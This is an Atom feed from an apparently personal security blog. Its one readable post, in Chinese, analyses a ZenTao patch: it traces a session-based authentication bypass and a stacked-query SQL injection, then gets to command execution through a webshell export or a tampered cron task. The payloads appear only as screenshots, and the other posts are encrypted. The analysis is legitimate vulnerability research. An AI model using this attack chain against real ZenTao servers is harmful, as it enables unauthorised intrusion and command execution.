<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-05T09:46:16.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>H3Bpm</title>
    <link href="http://example.com/2024/03/05/H3Bpm/"/>
    <id>http://example.com/2024/03/05/H3Bpm/</id>
    <published>2024-03-05T09:46:51.911Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="eebeb44cd2dd8e7dce102885ee2a6b41cfa396d0f3213fb0c57825baba622007"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Zentao RCE</title>
    <link href="http://example.com/2023/01/13/Zentao-RCE/"/>
    <id>http://example.com/2023/01/13/Zentao-RCE/</id>
    <published>2023-01-13T18:02:24.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>下载补丁后可以看到只有两个module发生了改变<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673516850229016736037008539.jpg"                                        ></p><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><p>和18beta1比对后发现<code>common/mode.php</code>有一处改动<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673517250207716736037008556.jpg"                                        ></p><p>由<code>echo</code>=&gt;<code>die</code>，看其所在函数名为<code>checkPriv</code>，推测其为权限绕过的补丁</p><p>在<code>index.php</code>中调用了其函数，没修复前的<code>echo</code>则对执行流程没有影响，会继续向下执行。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673517507133216736037008584.jpg"                                        ></p><p>再来看下<code>checkPriv</code>函数有哪些操作，<br>大概流程就是获取调用模块的名字和方法，定义了一些不需要权限的白名单调用方法<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673518235374516736037008606.jpg"                                        ></p><p>如果存在<code>$this-&gt;app-&gt;user</code>变量则将<code>session</code>中的<code>user</code>赋值给<code>$this-&gt;app-&gt;user</code><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673518356867316736037008615.jpg"                                        ><br>检查用户如果没有调用功能的权限则进入到<code>deny</code>函数，最后抛出异常，而在<code>catch</code>里仅仅是输出了异常并没有终止流程。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673579314899816736037008627.jpg"                                        ></p><p>重点就是<code>$this-&gt;app-&gt;user</code>怎么获取到</p><p><code>commonModel#__construct-&gt;commonModel#setUser</code></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673579541958316736037008640.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673579634580816736037008657.jpg"                                        ></p><p>可以看到<code>$this-&gt;app-&gt;user</code>获取有两种方式</p><ol><li>从<code>session</code>中获取</li><li>如果开启了匿名访问或是从终端访问则会设置<code>session</code></li></ol><p>匿名访问默认是关闭状态的所以利用有限<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590045981816736037008671.jpg"                                        ></p><p>现在来看下<code>$this-&gt;session-&gt;user</code>怎么获取<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590111959016736037008682.jpg"                                        ></p><p>搜索一下发现在<code>module/misc/control.php</code><br>中函数<code>captcha</code>中session名可控<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590154760816736037008704.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590595587216736037008716.jpg"                                        ></p><p>获取到session后访问下后台接口试下<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590626992816736037008732.jpg"                                        ></p><p>验证成功</p><h2 id="GetShell-or-RCE"><a href="#GetShell-or-RCE" class="headerlink" title="GetShell or RCE"></a>GetShell or RCE</h2><p>现在再来看下另一个patch的module<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673590726448116736037008752.jpg"                                        ><br>发现是对sql语句做了预处理，那么这里的应该就是存在sql注入，因为zentao的数据库使用的pdo所以可以多语句执行。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673591158392516736037008771.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673591594366416736037008783.jpg"                                        ></p><p>sql注入怎么到rce呢,在这里猜测下</p><ol><li>多语句执行可以在知道web的绝对路径下写入shell</li><li>结合其他功能进行操作</li></ol><h3 id="SQL-To-Shell"><a href="#SQL-To-Shell" class="headerlink" title="SQL To Shell"></a>SQL To Shell</h3><p>导出shell前提条件是，绝对路径在sql报错时已经爆出来了，还有一个条件是<code>secure_file_priv</code>没有设置值<br>docker起一个官方镜像<br><code>docker pull easysoft/zentao:18.0.beta1</code><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673592712472516736037008797.jpg"                                        ></p><p>满足利用条件。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673593551869216736037008807.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673593522154016736037008825.jpg"                                        ></p><h3 id="Cron-to-RCE"><a href="#Cron-to-RCE" class="headerlink" title="Cron to RCE"></a>Cron to RCE</h3><p>如果<code>secure_file_priv</code>被设置为NULL或其他值，则无法导出shell，那么怎么解决呢，粗略看了下后台的其他功能发现有一处计划任务存在利用。<br><code>module/cron/control.php#ajaxExec</code></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673593962991816736037008842.jpg"                                        ><br>大致流程:<br>遍历<code>zt_cron</code>表中的状态不为<code>nostop</code>的数据，如果数据中<code>type</code>为<code>system</code>则直接执行命令</p><p>但是在创建计划任务时会对<code>type</code>进行检测如果为<code>system</code>则返回错误<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594193539216736037008855.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594253062116736037008867.jpg"                                        ></p><p>那么要执行命令需要将新增的计划任务<code>type</code>修改为<code>system</code>，结合上面的SQL注入即可实现。</p><p>创建计划任务<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594502955316736037008878.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594865014616736037008896.jpg"                                        ></p><p>修改type<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594901772916736037008915.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594924393516736037008932.jpg"                                        ></p><p>执行命令<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673594979651516736037008949.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673595169260316736037008959.jpg"                                        ><br>等待触发<br>在日志中看到成功触发<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673595208111316736037008970.jpg"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673595155009116736037008981.jpg"                                        ></p><h2 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h2><p><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673603486815116736037008988.jpg"                                        ><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2023/01/13/1673603545165916736037008993.jpg"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下载补丁后可以看到只有两个module发生了改变&lt;br&gt;&lt;img  
                       lazyload
                       alt=&quot;image&quot;
                       data-src=&quot;ht</summary>
      
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ASPX Upload Tips</title>
    <link href="http://example.com/2022/11/03/ASPX-Upload-Tips/"/>
    <id>http://example.com/2022/11/03/ASPX-Upload-Tips/</id>
    <published>2022-11-03T18:33:17.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="958c83d97c43ca4e2dc5e9d1754d31b796e913320aaf612c0874952c33670322"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term=".NET" scheme="http://example.com/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>SmartBI</title>
    <link href="http://example.com/2022/03/08/SmartBI/"/>
    <id>http://example.com/2022/03/08/SmartBI/</id>
    <published>2022-03-08T14:57:38.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="10659951089e71ebc60f0e49cea1ad9980ccb41a0188d62e38d11500afe2ebbc">4fb3d45e54deadd9aab1c3fab00ecedc022f66b8c238b82b8f042192cc494c039a5a2d6d4733e2362c7a7e2551a369790fbd7fd2727fd8f01085c7c16b4ecfe222569af0cbbb20ee4b95c99d5fdd77afef637511309d4b5d9fba3f01fa658c74587f9f18514f01ed967f4bb5fd8f0bd85afeccb9c91ab0b37e489df4648c193fd05ae4ac1d9465ca26a9d7bd75385c334e5cf36cb3f03c2c1ee9d839ea64d18cc600a3c84f4faf53b6ccbb7c388204998e5562f3130685d440b53d1d9a62f7979a9290707d3ad12280f3921cfa999719f2799e024f8057b15c431de80d6994f763c3462e8b2a02ccd0870eee433567681c3176767bc3ab3156ec7d113c30f697dc36b5d3fe35f720e07d18b301d1863d20dbb00e9e11a61b715cd08d994ba91811a64b92e3533e15e407854e92c892395a5af036cf0c2602e52b9b17874a195f49ca2e57c70bd8cfda9fb166b260a6a4733b760e4891524654a7a0d9136d7676580c0cb7a70a60dbc930ded755b54e5e079f53172010a01d86c499e8da3be1a6ca52e036e79dc750d782eae1be1c54e920dd20c10dcdce9e4d12c90aed7c15a0f6097ce108d1e049814d685e1014dd14ac1683bf714128e9d5f5bf85633d425eef444e94c22bdd9f2e103a07861f5258bb5cf967acc7ec799a74d97a253a4c4623f38f7633157000a3a0e9a1c2718856f1c6f5ee7463f3b835dde85b69ae85410c1a43b84e1bcb533cd240d6657035743afde514946a6c3c7b088ee40c1d5971fb7d17f49da4a8472a7005b99eb5c6926bfe13d60f583874bf8c4716ab8964e61c2e9480bcc041f758d6a65fd9f20b7f4de98f773b3dca2179ecdf0a6769074cdf7f0511bd536718de18d8474c54005f6a2a858ee686f585e7cbb5a6e5652540323ac1d04efa356fa386431ca182bf5f23d849cb03fb16e8a9dc7d08287079af0a86775e87f0c4e2c8b0ab1c76c1a93ff1d7df2871be5f313594a5f572a8df0280a0df605e4fe50fbbdd3afda745a609585130f0a1d7b3923e40961a9672b0fd4d36d10bb91c60feeaae68fa50f7ea71b5153e794f27542cb048b5ddda8239c81f3a87fd906215400ab03b3c6c8c318fffd76bf4d441836524f91f9f30534b279b6c5e7a5e290d33bf1c7ce3d701abc7aac71bd0042ed828697f59fc46627f0ec1bb3091cf4023556b6d36c0f9941f9011fa77d96cf6c004fea8b995bc0cc491a2c7c563582dbb12dd25a91eda63c03785670442f2c334740a9bbbf4a20990a4a2a08373eb6e2b4a98ff83c381f256237b8e958b76ae7d25c43d14301592622f371328cf7eb72da6c852548e516b6284946a1d3574ae7109460248ee1344a456eba191642eb3099b2fdf9ac15752fcdc05ba2574f4cc3d1f6227be551b71b9d04aa6218dced074983e4637e49c39e6317c275eaf50b0ecd1ad55ae1988b46f2d1f8976ef8bc5c20e4634a3c5eb8394031061b3ed97c20f2f256b8164e86fa6782d2698c4b8cc3becbd971d37e9cb53dc8be25eac8e4ef04c624221f41f8f48bbc949f1c79d9883bd65fb62631987d424a5f46664a11067d6360e4e345d2c9fd8f4aa12993e19c8e8b9a2fcec1fddd2b54176ab106d49efdb61dcb29de5d244749329b2e269ee4017b846e7f1db9acfdc1d01c19df216371f34228836a66e087caa7beb5782669e5419a927151c7c31558f790f42f2481c6ea3e774d7820d64cd09ce3b5ddcae48697c818c02c1fbb479869acc9c1d948435e606d482c93653e5f42387b2d888095c9b03d9d44bca7c488010a2b4fe2e043b1bf0e229611ee1ffe0eca597b537ab72a8c65dc42972f1a297a65c741536460f66504c445e8297978577638b949cf9d182f22c1f949ba5d6a12dd4533f504623d141a7ae42e859d9ad3dae817ebae6650b21643e11afadcbeaee9eda95b17f6563cd58b2155a39bf49b0719006e8a5c57304f523c135d0b29e23abcbfdcf7e96ed682b9f52a4a0beca0d22f63f093b4f92f3d4bf8fbe30aba4aaa18c24a00fa239c2fad39b81928277ea727d524c55bb3a95513716820b44109c56298e3e8a8ab68d8be05a2b6e1ce2d4b601c0167448eb894d686dd573b30d0173eae26eb40b23b9ff91aa888e0684ea6f1b6bc7df85f7229e083f5e21be0a71f972cd7fa8aa777bb1b90514bdde827056b4638a7de7e568987328b806bfe6cb112305498065d0aebeff1ce56c161cf303734f35aaaec63bab11f296e878ae7893a54d0dc7dd33e750ba974aed62ebaa16e7ecb88e1b4ffea3ec4f9de70ba529b1fc1f1022361274f3f5b44f0acacb399053ec796cf9009067c49d8ff1c912d5c0ef0efb9bc23333cb07e4f3fd5023d8a0c28e0da7ec7d3ae56887df8feaca20a3a91aa2bb770ebba3c1bc4ec87f393943c96e0c705f285d884f57d390d3da89b33293eedb5741397147e06b81bda9614debd2dcd415cb0ff11b5c80ec966ec6290d7edfbc8ea2bcfbb3389dd154a6eb8b8e24b19ec6e52dd6fb51c9abbd0e4d66bcb8393f6172e16b1e9f07d62c7848d317e0ee597dffec4cb665987224e68c06e6aa37bd04edbb7ce89c9470ee28d46e7023b41e64deca05895be15812108dd98f93e5a0887be7e8501a5822f2d8cf8fc8582ee04b52c6a13baa46110a86f309ec5aa646319fd50b24c3b058f2621227ac25704a2c76f511f918793b7b7a8742d7fa783928bebed166a4c406642747cdb7da3ca061a1720880bfc1143fbf55436784ef96ca6a40cd6d25c7997adbdd50a02a048f63077a5ce21a4c3ea6814fab27d79d3b79a4798fd934db8d1d7154cedf70bb394d22cfff5a15f0ebb4b1abf3ecba1723c483668b62f86cbee2ad4a9b12e77056a30c8ac48188c4d89c0090f14f75e442cd0571e555e77818ebc28b18c197b37d839d5eafdbe19d4ba73e1bcc07c2547ccd8f5efd2787f6fe8cfb2b36d3fd2e273e5f902eba478a314b419b73a150b80dda2dcd2a0332c06330f0e2863cb1a8e783cca659e6becc45c414110f40264d50a2c5690c5714fefe1fd9818e53a96c421c924837bf35e09670f80ce06e8790e319be1c5fe5d8824c8ab215606b77c3581ac1b004d92f0565e94ce4fce34432d9ab52e8832eb34a013f260532ccf0943046e7a121be79821bb4830efdf6f5d9eb1657441bf62c4dc05dde91117e7b02ee36841ace26c08f665710968344b2d758cb9cf767a61f591db13882b66e5feee3ffb796dfb948faae23fa490940438cf92295c4443f6aa548c9af88932ca4480765bd54db24a7ffdc59e8d36e4687706757504c067e09c5daa30d4f9c884446d4c5ea8c1425fd47a2e8930c8a951c6ac5f5a32960eb481e6529fdeeed8b844d0be12f8748e042807342170ed5d06aedcb557bdcceadc38f49e7bb962e42a13b4c8cbf4c10880d9cbba13e9789413293e0af4c2460978900a07f585f6fc3a678c0e06ad84bc3c1994d58c7f75036db017b179b15a0926292440f2525b17326f6fe1f86844b94e027c3ef990aa1b3aa761ab7be224583a4434b8c35d535aaf8f547d55e2a7ca4c6dec7ede50d241c1dcc45f1d0b8790e1e2aa42f89b89fd543b337c511da817d18361e5224a9992d8c2c9806b73859a7819ee2a56217c6b436f59cc8a3b4a53f205fc9e4b3da7da805e4180f65c181e2ab999b9ea6e8be6f3c4f3c3f25103221990eb306d4f7c100b49f08712dffd8f55c818df92c5f2514fc7fea49ef838b535aa4acf986dd981cfa3efc6aa8c07b1507d8c0a681872501f255a3c4ac55bd65ab2e65c929c92a99775b56419171a52806232c8ac9dceec3535d381813265c546dc762c95aff9246de09cf9951a4f41586a9617003c2fcf9df948ff4636486d0f5a19d8f60d84a5ab9bdc318e19f3df9d6a5626d60097211967034176fb60c69d664bc4113b1cc14929f87d80991f411bc22e35e7caf8f91cf45494cbc18071a928c0bcdf08d1f269111d08eae2b1521c2abfcee394f51c2b43bb33efc8d0d3a3bfea97180e817a78aecdf8c3cf359e58123a212a8c69e23898d73db73d800e4f2b2d4526c55b3a191e1e759ca2d1ffc97c2167df08fcbc9baec40ad629b4ee291771ab920049622fa3606cfb668130e48a33988de0d2550873817719718f9eb1a2603d6c58c8cc903497c9dd659d7a556fd19ec58e756801c736319a7e61255f47b6967ada892eb8bd802283256278a4d6f5590dcd6e5f5415f80e791c02df99d2a6660c21c704db0e82fdccbddc3b7d653a0ef1beda193327f992738ba8f24be35c0247db24830c8a05696ff79d528691c70a1d155b994dfcdfc4c53e2612eebe1a7ea25bbf272da0eb80ae1f9925fee026d57c3f5ffbbe68d872502151cb7d6ae4661e6cd3d6409b0595ae8c2eb252e8516a338ff470629b367dfcf4dbdbc214fe26c24de69ff529b81bad40341c4fd4369955a07d5f4ce4d19c2218176dd6c86969a4f66226ff3f766a698d26a7de4b7bf24d96cb1383122a6bc67d6ddf0858d3cf23615d4fcf2a7f757f209353836ad43de52a11ccc17d56bff9eec507c9f46d625ed29387aa255bdaf187f12fdee2c5e26cefe09cdb574e8848d3625ac28731b9cd0f323617ac64d7b601f466b962caef77bd4705011a4abf96b740ef5174786e09fe3cda5ef1364a2ac22a62977811d784b65b54ff4939437b8762ea6a121ccaad654d42b9cf892298f0f74ba7f7b1d45a2c6f5c010f95718c56b7ba1e2141a49d8403ad77b60fee81a110c7347a6e0f86e34ccca7ce4c93eff2e43d7d4d91f340629f70403cc5cdfa42eb0a4fffdcf7927047f64c8db48e0c5cea834d1bcba2ae92caef3d26abd7f092222bc0a17c1a03c9168c4d12fa4f2dfd48ca9a990a5830c1fd102a20f2d4623eadb5ba87dd428352b8357f24a1f3e89d2b084486d09a7b86b6cc636c4199f111e8615d2a59d1387bcb573ca8fdce8eece5258106038f162211aa268a1780c242192e5540840cc798266f8567bedb9009b01a67c2548f90be55d1685588e78a2a1388e7ccc8613d06d5e2f3634bda1a2c02570286540a3dac218f330910d41fa7851b110da7bf12b47ee3e8c170f0cd12e38161843de53aaf0f0e43a798eeda0ab3d4ebb0430614d61561e6ae3beea44f2b5640ae9fa32922f6ab59ae90f5352fcc67b2a6f693302685f6e7807be7aedf98fbac32d3be55b16ead78de08d601029ed418330641222bc26eca361f0c36b6ceead47d60dd5d1fd83061c11057fded89f74a8444284b4cd27189a7d907a186b7ea7e2aad2641600ed528b8546595f912598c7dc322c123eb990720e5560f5c10b6f1427b2ac52b9fa8da80967f25c91a154169bdb2e0533bc556844895c3eb749b9ccd12d9fc04c5720f3d464ee050953fb29e9cb035800d18fd45644bca7c34470a38311b951fe00c0ff856691e07f5db1b6256a8c94af2015e2443ef318f58300e150e62a3821e6246990becd2528fca30eff44757b7bddfa8a5f3c8f1af5bc4a34dbafcc3669f4d90b9fd760de9f81bd7e0722f39e316f2406c21b537a2791f8c76914a19fffdc692248c9d8d344c37c88dc0a6b9a0ee941038316157f0a574556d1c5dc88ca933a5cce3b26a7150017471464d2d69fc7a2127fba87d7b1f71d80998af28507ee80b349dcf48fa118b1122b19e18d259b2d932c0933e1aa8a7be8529edb01ebb094fadc40855776259c8e97643e5fee0061f465944ecb934e0812ec55be62b1922b9384ad888b66cf3231eaf8c5b45bb912a74f358c653ad6518bbd323e5bffcb66ae3a82cce7689e76e280b2f9e83d0845ea14de6c3f2e2bab0572ac8f7cd22dc416a3f7c6d69ef0fde6597169b7da787edad8bdfd9d422fae268c6c5dbb94cdc6a5ba2ef745e9ca973d3b357325889e993bacbeb392d8b4513e0449d250127b290ae01d5673071179d1242036842b0847715712c9abca8ea21752d46f86de21c9807f526c7a639c0e06c1fd8ec6ed385d75ad0cb9522e06d89cfbc6a52c4c82fcc4b52325996f28b09db1ff90b4353d3ef5bc3252aa255671cb14162b76829fc2a42ed94a43f07e4d6c387e554bb0d714393b042e4c85d8a2b76dc68ca5519f10f3f7ee72d6108b62b8a2e4aebac52756a71ce39c6e51626cc634d6b0daa478d635ac37db6fa4a7401301f32f318052f72da094cb571b364266e9020e6626249632ca64cc51c5f1fc7cd5240b20c4eef207f1183983dfa6944006de8e08c1494f5b5a8e1a1136de58d2bd09c22f2f3fd6a332c59bf03ced8c392accd5ccb2748f84da9c3e416e5500b6216701b55dbb649c15f1eb79976fd7680d5fa8ccfdb96cc833778ef0610bd49acd631368d5e3dfa104e2ba5b3a458825a49f10931b3715038cc7e36cb5b084b6291609175e4ad2976a75dc7664fad06a42f223687bc739ec9b0a63d05f4f6dca31fb2aa64daab74dac8dc8abc82736f2b35971363cc85dc0e96202be3ff0022f44221581aad6e735baad4a19d4944e5844069d26a6d55aa9bca4d4f3a800ed69d6cca67151f6f1c95aa8429c130de00d5b3af9d24623e73901b4ce0d249f0995cd8373abdca4aa873a24047fa18a55e1d403efd9cacf29a763561336630f883dcb33a4bd5bb68a1f5bdc3e911704ec0e7e88af3af73e9667287d1f5bcd151cc846e36fb52e946d1ec503827f7d5db3639863f3272a3d12140445b31c037e2a6cb552021204cbd1e31131bc9bd5eacf179c0318501168383a127ceb56217f7adbe75ee61933f11958550c08cd256aa3222384c424366be7c6eee953392989f6b81f50a4e6824a31b8c42b8f5d04232018c0061986f71282ddba76cbd3b98b1060e3b1cc945f72b6b59beeebcb5b60b9a6b315fe6911f9caadcab0cdc846d0702d3cf2f7f8ded9d05cc2a8a212a7748701355076419a0275e0c7a9a5a4cd6b02392bdb82a09a504aa6f62e83feaa4b5310abc7bc5760aa4b619c48ee34166d6bd628792d759231a6ef0216050c222fe69c631fe6a258de0bf979aaa2d3f65aa106daf9750b1c033c5968dc1cc9f23917e70e40724de9de0ee9a55d3cb4fc8dfe1efeec24184ec931b005bec6fea46fec90d5f1ef2f3c13757f8533be5917d7bf411b124810315e34101001bea4bb9fd28fe70e5ca80e8f5bf63e6a5c58b0104c54a274cb95157fcbc3d292e36d0fa4aa4692fdddd27b0eafae6de76edc397af72aa7b0cdedcf3cfab14c703beec01d61a82440a2766a542a014767a935132fcfdc3d96c7862e00051f967a27163381966ae0a76098240f5caac02279b7f9cc3fcb4b3adfc840ec7e64e9d633bd108acceda3d4e05acf8ec618da476bb18c7f87d04b1e14be1532f1f72c5afe163e9cda4c5fc26f6b822dcba239ec317b3bd970688145679da33ef8fa0cf48d4cfe716806cbf63a4ae2021567ca43f9fb892ccf56db0d5d4f75b3f40dd40bf63a9fdaabd4a704a6a5ebbbeb5ce715ce55b7041afa0a231f96668b281ba911dbaf9dc5ebe9456229e03b4a744bc0eb410dbe1a28b92197cf6e15f575ae21b1a5fb675991e8bac9f74c173380387a702a8b38ed26b0c150c206b9c72cbd32823eed2fe99a40b0ed6171c6cd9bbcaa3b6c6c197c5f2853fd37e3d9a168a1f03c1f68eb4f76ae62761dfb8f0e6b936dd15bea857b7555b0d896123b14a978916453bc5cb2275c089337a1c136f52e888ff90a83316471722cb6e489a81dc3fef432cdbbfb6f8a6a556b4a9c63d18333b3802bf84cf73a29f5bcb3ff1c9ff6a4c0c46645ec09923bc3f76e34215f9a93c1814dd43533278eea46a83db89fe6f985adbba66bef7e0aad63c9f2f5659e814c13f5e4be57be3781537fb8de8311b9997030e63e97d636be386da110da9a98fafa01a8888ccc3e25096610b22910d0062b1a5f01c33c115721b7aaef855ee710f104d9bc660de267ec74ddf3e8f1ae1c0b4ffd104b795d78fa88f07b2c8473c6df49528d615826c55ae4977587b8887b6ec8b7685739574c489b4e5026738d07582e997d3a0eae17e0352e4c9b5c4421833acddf0380fcdcc933beab8f203c5bb49ff0bc3dc9ce84ff45f210ea996948665485081b4a928b40ab2f9eded2b84b4488ff729df70dccf38d811b34e805ce31595e864b6375b07552708d7ee284580895512a3a97ed0741c875ce695119f9d19085b231588f788ed60f2c92beae1d014ce1dc92b08ea0bad90d19d8ceedec765f89149285f834af4c41ab4214a00c059c0adc37cab62c8d2255a0861ec7bf6be97a506b28a568309c7519817236624b1b788a9b680b318c9bd4ec3e85d3a81ae304245f7618d166866ee2a26f04276d037cd3ca925701d9d0660f6191121ea80c524980249903810be07d1d9149c51607305f6246020a762dcfb1295233f601071d115708331a53cbd7c1b8501759b1de3d2b19030f8f87bcff4d04d924233b3d80d5e4178b439b392193793ff841ff68a00bd2e0105e036dde919c337b69f85fc750ec713b6412c9e42c5e1370620932e8e4465afc336e4e1ee7d98bd452d3c9dceb62bde2ab2883654b2ecfbc14e479868ca694b62c16a5bb9694dd299e5216d5a96137d897780b6947aa6573b76aa3cbfabbdc520bf93d26a51da432a1a81750ad0af290080f8e5e183fdbd45ccac2f9481048388471440fd8224a793cff20a73f38625fbcd06bb5b731e8b41286182ff3f5f6cb326d9d3ca9de8d2e742256d67934ef496945953989a86bee02280fd3e4765ae59f50b5f75edcaffdcba67eeabfdc35562725eda9a441ca467f2ace4ee00f9e9219fdcc32393e2e1cb9fb6308a947731bdf6818ab43184ae008780d983efdf549ddb03831d914f29b60b6c53570b7e46263895997ac306c994e427fd73159a67613c5eb385f3592c40c15a5485be503016d1c2bbfbda941fde4835122a5c15f03a606b2c34e59691d447c102ee9641fb5c27f6316419531bbac75505c16ac8da90918a2f5bb69c76b09fc45a8a98a8956f84ca2e1931e20458aa3ba8c1b584d1ea79d4bda52d6362861cc5012fb9913a7d0997585ad66df5860eef94aceaa45cd6268b79c80582d7ef8cdda37c532ea3413262613643a3163597d6d29aa469ee534c8cd2ba5c5596230e4f2be9bb25c1460a36d8c5988d23335206782657ea99084ec1643c8a7b821a7cffcacd944eb3b21ac0a3e0d1f3466a2ceadfa50fb8bc814184ee7f035d5206c7528f57f559f4c6ee300b3f57bd11f44e6401297490a8d061b25ede6a024bea2cbb2d42cc0ed0cc1512f730cd393abaafd76c4de3ddc53d2faec360577f6dfc25d0f33b67d34054182994b88e930e7c079440e50e28062a0719018512a97fa64f21a3405edb26341f7b7df6be47574d9eaac42c6bb7913df83bf2f3acaa404af238cb505e348b10ab1634f4e0b3a0cff7e24957c8137f011f1e1f85d2d0379b172f2e2944936b9522ee00a0a41a71235ab02874dc8c0a010b357629d26a3d9c08086f34d638095f806fe83d4e60cb399c9ffda39664e87532f7d5e59fdb6b9e0634565ff989c8999b41471af19647d8dcd8ce47c620cff402f92358833758d0